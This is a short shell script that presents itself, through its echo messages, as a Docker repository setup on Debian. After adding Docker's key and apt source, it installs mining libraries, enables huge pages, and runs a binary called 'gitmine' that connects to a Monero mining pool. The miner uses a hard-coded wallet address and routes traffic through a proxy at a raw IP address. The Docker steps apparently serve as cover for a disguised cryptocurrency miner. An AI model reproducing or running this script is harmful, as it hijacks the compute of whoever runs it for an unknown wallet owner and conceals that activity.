echo "🔧 system package update and install..."
sudo apt update
sudo apt install -y ca-certificates curl gnupg lsb-release

echo "🔐 add Docker GPG key..."
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
sudo chmod a+r /etc/apt/keyrings/docker.gpg

echo "📦 add Docker supply..."
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

echo "🔄 update APT supply..."
sudo apt update
sudo apt install libuv1-dev libssl-dev libhwloc-dev -y
sudo sysctl -w vm.nr_hugepages=1280
./gitmine -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_GIT -k --proxy=98.175.31.195:4145
